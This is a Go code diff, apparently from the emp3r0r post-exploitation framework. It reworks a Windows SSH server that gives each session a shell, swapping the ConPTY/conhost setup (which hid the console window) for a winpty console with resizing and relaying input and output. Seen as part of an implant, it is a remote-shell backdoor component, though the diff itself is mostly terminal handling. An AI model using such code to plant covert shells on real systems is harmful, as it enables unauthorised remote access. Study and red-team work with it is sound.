@@ -10,13 +10,12 @@ import (
 	"log"
 	"os"
 	"os/exec"
-	"runtime"
 	"strconv"
 	"strings"
-	"syscall"
 
 	"github.com/gliderlabs/ssh"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	"github.com/jm33-m0/go-console"
 	"golang.org/x/sys/windows"
 )
 
@@ -45,30 +44,10 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 
 	ssh_server.Handle(func(s ssh.Session) {
 		cmd := exec.Command(exe, args...)
-		if IsConPTYSupported() && runtime.GOARCH == "amd64" {
-			log.Print("ConPTY supported, the shell will be interactive")
-			conhost_exe, err := exec.LookPath("conhost.exe")
-			if err != nil {
-				io.WriteString(s,
-					fmt.Sprintf("conhost.exe not found, PATH=%s\n",
-						os.Getenv("PATH")))
-				return
-			}
-			if len(args) > 0 {
-				args = append([]string{exe}, args...)
-			} else {
-				args = []string{exe}
-			}
-			cmd = exec.Command(conhost_exe, args...) // shell command
-		}
-		cmd.Env = os.Environ()
-		cmd.Stderr = s
-		cmd.Stdin = s
-		cmd.Stdout = s
 
 		// Evlsh
 		if shell == "elvsh" {
-			cmd.Env = append(cmd.Env, "ELVSH=TRUE")
+			os.Setenv("ELVSH", "TRUE")
 		}
 
 		// remove empty arg in cmd.Args
@@ -79,14 +58,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			}
 		}
 		cmd.Args = tmp_args
-
-		// ConPTY
-		cmd.SysProcAttr = &syscall.SysProcAttr{
-			HideWindow:    true,
-			CreationFlags: windows.CREATE_NEW_CONSOLE,
-		}
-
-		_, cancel := context.WithCancel(context.Background())
+		ctx, cancel := context.WithCancel(context.Background())
 		defer cancel()
 
 		// console configs
@@ -95,28 +67,74 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			log.Printf("Got an SSH PTY request: %s", ptyReq.Term)
 			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
 		} else {
-			log.Print("Got an SSH request")
+			log.Print("Got a non-PTY SSH request, might not work")
 		}
 
 		log.Printf("sshd execute: %v, args(%d)=%v, env=%s",
 			cmd, len(cmd.Args), cmd.Args, cmd.Env)
 
-		if IsConPTYSupported() && isPTY {
+		// use winpty PTY implementation if ConPTY is unsupported
+		winpty_shell_proc, err := console.New(80, 20)
+		if err != nil {
+			err = fmt.Errorf("Creating new winpty console: %v\n", err)
+			io.WriteString(s, err.Error())
+			return
+		}
+		defer winpty_shell_proc.Close()
+		resize_console := func() {
 			win := <-winCh
 			if win.Width <= 0 || win.Height <= 0 {
 				log.Printf("w/h is 0, aborting")
-			} else {
-				cmd.Env = append(cmd.Env, fmt.Sprintf("TERM_SIZE=%dx%d", win.Width, win.Height))
+			}
+			os.Setenv("TERM_SIZE", fmt.Sprintf("%dx%d", win.Width, win.Height))
+
+			// winpty
+			err = winpty_shell_proc.SetSize(win.Width, win.Height)
+			if err != nil {
+				log.Printf("Error resizing winpty console: %v", err)
 			}
 		}
-		err = cmd.Start()
+
+		// resize console
+		if isPTY {
+			resize_console()
+		}
+
+		// start shell
+		err = winpty_shell_proc.Start(cmd.Args)
 		if err != nil {
-			log.Printf("Start shell %s: %v", shell, err)
+			err = fmt.Errorf("start SSH shell %v: %v\n", cmd.Args, err)
+			io.WriteString(s, err.Error())
+			return
+		} else {
+			go func() {
+				for ctx.Err() == nil {
+					resize_console()
+				}
+			}()
+		}
+
+		// send console via SSH
+		go func() {
+			_, err = io.Copy(winpty_shell_proc, s)
+			if err != nil {
+				err = fmt.Errorf("io copy to winpty: %v\n", err)
+				io.WriteString(s, err.Error())
+				return
+			}
+		}()
+		_, err = io.Copy(s, winpty_shell_proc)
+		if err != nil {
+			err = fmt.Errorf("io copy to SSH: %v\n", err)
+			io.WriteString(s, err.Error())
 			return
 		}
-		err = cmd.Wait() // wait until shell process dies
+
+		// wait shell process so we can clean it up
+		_, err = winpty_shell_proc.Wait()
 		if err != nil {
-			log.Printf("Wait shell %s: %v", shell, err)
+			err = fmt.Errorf("Wait winpty shell: %v\n", err)
+			io.WriteString(s, err.Error())
 			return
 		}
 	})
